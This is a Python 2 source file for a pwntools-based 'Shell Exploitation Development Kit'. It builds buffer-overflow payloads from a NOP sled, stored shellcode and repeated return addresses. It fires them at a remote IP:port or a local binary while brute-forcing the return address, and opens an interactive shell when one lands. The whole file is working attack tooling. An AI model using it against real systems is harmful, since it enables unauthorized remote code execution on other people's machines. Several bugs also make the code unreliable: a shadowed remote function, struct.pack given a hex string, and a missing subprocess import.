from pwnlib import *
from pwn import *
import argparse
import struct
import os
import sys

#Declared lists and dictionaries that act as lookup tables.
os_types = ["linux", "windows", "freebsd", "bsd", "BSD", "Linux"]
binuti_is = {"ppc64" : 'powerpc64', "ppc": 'powerpc',  "mips64": 'mips64', "thumb":'thumb', "amd64" : 'amd64', "x86":'i386', "mips":'mips', "x86_64" : 'ia64', "arm": 'arm' }
shells = {"ppc":"ppc.shell", "ppc64":"ppc.shell", "mips":"mips.shell", "mips64":"mips.shell", "x86_64":"lin64.shell", "x86":"lin86.shell", "arm":"arm.shell"}

#Custom exception class for fancy error printing.
class SXDK(Exception):
    pass

#Generate Shellcode:
#   Does the heavy lifting for generating shellcode by compiling the
#   flags that were taken in via argv and argparse.
class GenerateShellcode:
    def __init__(self, num_of_addresses, total_size, operating_system, architecture, starting_address, offset, endianness, name_of_file):
        #Initialization of self variables.
        self.num_of_addresses = num_of_addresses
        self.total_size = total_size
        self.operating_system = operating_system
        self.architecture = int(architecture)
        self.starting_address = starting_address
        self.offset = offset
        self.endianness = endianness.lower()
        self.data = None
        self.instruction_set = None
        self.shell_os = None
        self.name = name_of_file

    #parse_inputs:
    #   Initial parsing and validiation of inputs.
    def parse_inputs(self):
        #Initiates the starting address to a hex value.
        self.starting_address = int(self.starting_address, 16)
        #Splits the input and checks lookup tables for valid entries.
        if '/' in self.operating_system:
            self.shell_os, self.instruction_set = self.operating_system.split('/')
        else:
            raise SXDK("Input to Operating_system field was wrong.")
        #Validates the instruction set that was entered.
        if self.instruction_set.lower() in binuti_is:
            context.arch = binuti_is[self.instruction_set.lower()]
        else:
            raise SXDK("Input into operating_system is wrong.")
        #Validates the os_type
        if not self.shell_os.lower() in os_types:
            raise SXDK("Input into operating_system is wrong.")
        context.os = self.shell_os.lower()
        self.shell_os = self.shell_os.lower()
        #Ensures that the arch is either 32 or 64 bit. May add support
        #for 16 bit at some point.
        if self.architecture != 32 and self.architecture != 64:
            raise SXDK("Input into architecture is wrong.")
        context.bits = self.architecture
        #Normalizes inputs to either little or big for endinaness.
        if "little" in self.endianness or "big" in self.endianness:
            context.endian = self.endianness
        else:
            raise SXDK("Input into endianness is wrong.")
        #Sets variable for struct.pack inputs of endianess.
        if "little" in self.endianness:
            self.endian_flag = "<L"
        else:
            self.endian_flag = ">L"
        #Calculates the size, number of nops and so on for the
        #shellcode. Setting a max size seems to add more issues than
        #having the size of nops+shellcode set. may switch to having
        #a number of nops instead or reffering to total size as the size
        # of nops and shellcode.
        temp_size = self.total_size - (4*self.num_of_addresses)
        shellcode_file = open(shells[self.instruction_set.lower()], "r")
        self.shell_data = shellcode_file.read()
        self.shellcode_size= os.path.getsize(shells[self.instruction_set.lower()])
        temp_size = temp_size - self.shellcode_size
        self.total_nop = temp_size
    def write_file(self):
        f = open(self.name, "w")
        #Magic to get the content out to a file.
        #Arbitrarily determines the length of a NOP instruction based on the instruction set
        #and then adds that many NOPs given the size available. Then it will add
        #the addresses times the number requested.
        f.write("{0}{1}{2}\x0A".format(asm('nop')*(self.total_nop//len(asm('nop'))), self.shell_data, struct.pack(self.endian_flag,self.starting_address)*self.num_of_addresses))
        f.close()
    #Does a remote connection, assuming the input is taken through stdin.
    def remote(self, remote):
        #Splits the ip/port.
        ip_addr, port = remote.split(':')
        #Itterates through a range so that it can decrement the address from user input
        #and hopefully finds the shell that will pop a binary. Will open a interactive
        #shell through pwn.
        for i in xrange(0,10000):
            s = remote(ip_addr, int(port))
            s.send("{0}{1}{2}\x0A".format(asm('nop')*(self.total_nop//len(asm('nop'))), self.shell_data, struct.pack(self.endian_flag,hex( int(self.starting_address, 16) - i*self.total_nop )[2:])*self.num_of_addresses))
            try:
                connection_output =  s.recv(1024)
                self.write_file()
                print connection_output
            except:
                pass
            if connection_output:
                try:
                    s.interactive()
                except:
                    pass
                s.close()
    #Opens a binary and throws the shell data + nops into a buffer
    #referenced from ARGV. Will extend this later to allow options for
    #stdin.
    def binary(self, binary_name):
        if not './' in binary_name:
            binary_name = "./{}".format(binary_name)
        for i in xrange(0,10000):
            try:
                p = subprocess.Popen([binary_name, "{0}{1}{2}\x0A".format(asm('nop')*(self.total_nop//len(asm('nop'))), self.shell_data, struct.pack(self.endian_flag,hex( int(self.starting_address, 16)- i*self.total_nop )[2:])*self.num_of_addresses)])
                stdout, stderr = p.communicate()
                print "i = {}, decrement = {}".format(i, self.total_nop)
            except:
                pass
            if stdout:
                print "The current egg at: {} should pop a shell on your machine.".format(self.name)
                self.write_file()

if __name__ == "__main__":
    #Parse arguments from argv / cli.
    parser = argparse.ArgumentParser(description="Shell Exploitation Development Kit")
    parser.add_argument("-f", "--num_of_addresses", type=int, help="Number of addresses at the end of the egg.")
    parser.add_argument("-t", "--total_size", type=int, help="The total size of your egg.")
    parser.add_argument("-o", "--operating_system", type=str, default="linux/x86", help="The OS of your system. Ex. Linux/PPC, Linux/x86, Linux/x86_64 ")
    parser.add_argument("-a", "--architecture", type=int, default=32, help="32 or 64 bit depending upon the machine.") #This changes the relative offsets and shellcode.
    parser.add_argument("-s", "--starting_address", type=str, help="The starting address for your system based upon your stack.")
    parser.add_argument("-e", "--endianness", type=str, default="little", help="The endianness of your program. EX. little, big")
    parser.add_argument("-d", "--offset", type=int, default=0, help="The offset relative to the address. Utilized for guessing multiple spaces.") #Future release to have automated guesses.
    parser.add_argument("-n", "--name_of_file", type=str, default="egg.out", help="Name of the output file.")
    parser.add_argument("-r", "--remote", type=str, help="Connects and sends data to a remote endpoint. Format: IPADDR:PORT")
    parser.add_argument("-b", "--binary", type=str, help="path to the binary that is to be exploited. Assumes input through argv.")
    args = parser.parse_args()
    #initial validation to ensure the correct amount of inputs.
    if not args.starting_address and not args.num_of_addresses and not args.total_size:
        parser.print_help()
        quit()
    #processes the shell to generate.
    genshell = GenerateShellcode(args.num_of_addresses, args.total_size, args.operating_system, args.architecture, args.starting_address, args.offset, args.endianness, args.name_of_file)
    try:
        genshell.parse_inputs()
    except:
        pass
    #Remote execution.
    if args.remote:
        genshell.remote(args.remote)
    #Binary execution.
    elif args.binary:
        genshell.binary(args.binary)
    #General exectuion with output to a file.
    else:
        genshell.write_file()
